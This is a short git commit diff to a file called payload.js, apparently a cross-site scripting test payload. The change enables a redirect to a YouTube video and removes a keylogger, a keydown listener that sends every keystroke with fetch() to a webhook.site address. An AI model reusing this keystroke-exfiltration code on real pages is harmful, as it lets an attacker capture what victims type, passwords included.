29d3cdde048000e7d6d593d0d1a51f24a6c6652a
Lucas Lalumière <111912000+Shlucus@users.noreply.github.com>
2025-06-01 23:32:11 -0400

    Update payload.js

--- javascript/payload.js
+++ javascript/payload.js
@@ -1,5 +1,2 @@
-//document.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&themeRefresh=1";
+document.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&themeRefresh=1";
 alert("Payload executed");
-document.addEventListener('keydown', function(e) {
-  fetch("https://webhook.site/97c509af-aaa1-4551-904e-4acb73adc96c?key=" + e.key);
-});
